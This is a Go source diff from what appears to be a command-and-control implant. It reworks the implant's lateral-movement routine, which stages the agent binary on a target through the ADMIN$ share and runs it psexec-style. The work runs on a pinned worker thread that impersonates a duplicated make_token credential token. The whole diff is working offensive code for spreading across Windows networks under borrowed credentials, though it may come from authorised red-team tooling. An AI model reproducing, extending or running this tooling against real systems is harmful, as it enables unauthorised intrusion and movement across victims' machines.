@@ -57,7 +57,7 @@ func runLateralChild(args []string) error {
 
 // lateralMove stages this agent binary on the target through the ADMIN$
 // share and starts it with the requested execution method. Every network
-// operation runs under this child process identity, which carries the
+// operation runs under the pinned worker's thread identity, which carries the
 // active make_token credentials when one is set; without a token the move
 // uses the agent's own identity and requires local admin rights on the
 // target. The staged copy needs embedded connection settings (base URL and
@@ -424,46 +424,107 @@ func removeStoppedLauncher(path string) error {
 	return err
 }
 
-// lateralPsexecGoroutine runs psexec on a goroutine with a locked OS thread
-// so ImpersonateLoggedOnUser (applied by reestablishThreadToken) governs the
-// ADMIN$ write and SCM calls directly. This avoids CreateProcessAsUserW and
+// lateralThreadGoroutine runs lateral methods on a goroutine with a locked OS thread
+// so ImpersonateLoggedOnUser applies the captured dispatch-time token to the
+// ADMIN$ write and native execution calls. This avoids CreateProcessAsUserW and
 // its SE_ASSIGNPRIMARYTOKEN_PRIVILEGE requirement: thread impersonation with a
 // LOGON_NEW_CREDENTIALS token covers all outbound network auth without any
 // special agent privileges.
 //
 // The goroutine's thread impersonation is independent of the main goroutine's
 // thread token; the main goroutine's impersonation state is not affected.
-func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
+func lateralThreadGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
+	return runLateralThread(ctx, payload, lateralMoveWithProgress)
+}
+
+// runLateralThread scopes impersonation to a pinned worker. The injected move
+// supports local identity tests without remote execution.
+func runLateralThread(ctx context.Context, payload lateralPayload, move func(lateralPayload, func(string)) (string, error)) (string, error) {
+	return runLateralThreadWithCleanup(ctx, payload, move, clearLateralWorkerIdentity)
+}
+
+// clearLateralWorkerIdentity removes impersonation before thread reuse.
+func clearLateralWorkerIdentity() error {
+	if ok, _, err := procRevertToSelf.Call(); ok == 0 {
+		return fmt.Errorf("clear worker thread token: %w", err)
+	}
+	return nil
+}
+
+// runLateralThreadWithCleanup keeps final completion behind identity cleanup;
+// the cleanup seam permits failure and ordering tests without corrupting tokens.
+func runLateralThreadWithCleanup(ctx context.Context, payload lateralPayload, move func(lateralPayload, func(string)) (string, error), clearIdentity func() error) (string, error) {
+	if err := ctx.Err(); err != nil {
+		return "", err
+	}
+	token, err := captureLateralToken()
+	if err != nil {
+		return "", err
+	}
 	ch := make(chan lateralResult, 1)
 	progress := make(chan string, 1)
 	go func() {
 		runtime.LockOSThread()
+		result := lateralResult{}
 		debugEvent("lateral.worker.start", nil)
 		defer func() {
 			debugEvent("lateral.worker.revert_identity.begin", nil)
-			if ok, _, err := procRevertToSelf.Call(); ok == 0 {
-				identityBoundaryFailure(fmt.Errorf("clear worker thread token: %w", err))
+			err := clearIdentity()
+			if token != 0 {
+				_ = token.Close()
+			}
+			if err != nil {
+				result.err = errors.Join(result.err, identityBoundaryFailure(err))
+				result.result = ""
+				ch <- result
 				// Exiting while pinned makes the Go runtime discard this thread.
 				return
 			}
 			debugEvent("lateral.worker.revert_identity.complete", nil)
 			runtime.UnlockOSThread()
 			debugEvent("lateral.worker.stop", nil)
+			ch <- result
 		}()
-		// Apply the active make_token credentials to this goroutine's OS thread.
-		// This is a no-op when no token is active, so psexec still works under
-		// the agent's own identity.
-		reestablishThreadToken()
+		// Use the dispatch-time token even if the main thread later replaces
+		// or revokes its active token while this worker is starting.
+		if token != 0 {
+			if ok, _, err := procImpersonateLoggedOnUser.Call(uintptr(token)); ok == 0 {
+				result.err = identityBoundaryFailure(fmt.Errorf("apply worker thread token: %w", err))
+				return
+			}
+		}
 		debugEvent("lateral.worker.apply_identity.returned", nil)
 		if identityBoundaryFault.Load() {
-			ch <- lateralResult{"", errIdentityUnsafe}
+			result.err = errIdentityUnsafe
 			return
 		}
-		result, err := lateralMoveWithProgress(payload, func(ack string) {
+		if err := ctx.Err(); err != nil {
+			result.err = err
+			return
+		}
+		result.result, result.err = move(payload, func(ack string) {
 			rememberLateralCleanup(payload, ack)
 			progress <- ack
 		})
-		ch <- lateralResult{result, err}
 	}()
 	return awaitLateralResult(ctx, ch, progress)
+}
+
+// captureLateralToken owns a duplicate of the dispatch-time token so replacing
+// or closing the main thread's handle cannot change a queued worker's identity.
+func captureLateralToken() (syscall.Token, error) {
+	tokenMu.Lock()
+	defer tokenMu.Unlock()
+	if identityBoundaryFault.Load() {
+		return 0, errIdentityUnsafe
+	}
+	if !tokenActive || activeToken == 0 {
+		return 0, nil
+	}
+	var handle syscall.Handle
+	process := syscall.Handle(^uintptr(0))
+	if err := syscall.DuplicateHandle(process, syscall.Handle(activeToken), process, &handle, 0, false, 2); err != nil {
+		return 0, fmt.Errorf("capture lateral worker token: %w", err)
+	}
+	return syscall.Token(handle), nil
 }
